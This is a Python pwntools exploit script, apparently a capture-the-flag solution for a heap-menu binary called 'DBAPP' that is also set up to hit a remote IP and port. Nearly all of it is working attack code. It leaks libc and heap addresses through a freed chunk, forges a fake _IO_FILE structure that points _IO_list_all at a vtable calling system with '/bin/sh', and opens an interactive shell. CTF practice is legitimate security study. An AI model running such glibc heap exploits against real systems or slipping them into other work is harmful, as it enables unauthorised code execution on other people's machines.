# coding:utf-8
from pwn import *
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 1
if LOCAL:
    io = process('./DBAPP')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    elf = ELF('./DBAPP')
#    context.log_level = 'debug'
else:
    io = remote("39.107.33.43", 13570)

def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def mmenu(choice):
    io.recvuntil("Your choice:")
    io.sendline(choice)

def Add(length,name):
    mmenu('2')
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the name of item:')
    io.send(name)

def Show():
    mmenu('1')

def Delete(index):
    mmenu('4')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))

def Change(index,length,name):
    mmenu('3')
    io.recvuntil('Please enter the index of item:')
    io.sendline(str(index))
    io.recvuntil('Please enter the length of item name:')
    io.sendline(str(length))
    io.recvuntil('Please enter the new name of the item:')
    io.sendline(name)

Apps_addr = 0x00000000006020A8
system_libc = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook_libc = libc.symbols['__malloc_hook']


#leak libc_base and calc some useful addr
Add(0x100,'/bin/sh\x00') #0
Add(0x100,'AAAA') #1
Add(0x100,'AAAA') #2

Delete(1)
Show()

io.recvuntil('1 : ')
data = u64(io.recv(6).ljust(8,'\x00'))
success('data:'+hex(data))

libc_base = data - malloc_hook_libc - (0x7f43a522ab78 - 0x7f43a522ab10) #0x7f43a522ab10  0x7f43a522ab78 <main_arena+88>:	0x17e5350
free_hook_addr = free_hook + libc_base
system_addr = system_libc + libc_base
success('free_hook_addr:'+hex(free_hook_addr))
success('system_addr:'+hex(system_addr))
Delete(2)
Add(0x300,'AAAA') #3
Add(0x300,'AAAA') #4
Delete(3)
Add(0x210,'AAAA') #5
Add(0x40,'AAAA') #6
Add(0x40,'AAAA') #7
Delete(6)
Delete(7)

Show()

io.recvuntil('7 : ')
data = u64(io.recv(3).ljust(8,'\x00'))
success('heap:'+hex(data))

Delete(5)
Add(0x10*17,'AAAA') #8

vtable_addr = data - 0x20
from FILE import *
context.arch = 'amd64'

fake_file = IO_FILE_plus_struct()
fake_file._flags = u64("/bin/sh\x00")
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base = libc_base + libc.symbols['_IO_list_all'] - 0x10
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = vtable_addr

payload = ''
payload += str(fake_file)

payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(system_addr)
payload += '\n'

Change(2,0x200,payload)
io.interactive()